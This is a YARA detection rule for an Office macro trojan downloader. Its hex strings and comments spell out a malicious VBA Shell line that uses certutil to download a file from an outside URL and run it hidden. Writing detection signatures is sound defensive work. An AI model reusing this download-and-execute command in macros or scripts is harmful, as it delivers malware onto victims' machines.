
rule TrojanDownloader_O97M_Powdow_PDL_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.PDL!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 64 6f 78 69 74 69 6e 67 2e 63 6f 2e 7a 61 2f 77 70 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f 4a 2e 63 6f 6d 22 } //1 = Shell("cmd /c certutil.exe -urlcache -split -f ""http://doxiting.co.za/wp/wp-content/uploads/J.com"
		$a_01_1 = {26 26 20 47 76 6f 78 77 7a 68 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29 } //1 && Gvoxwzh.exe.exe", vbHide)
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}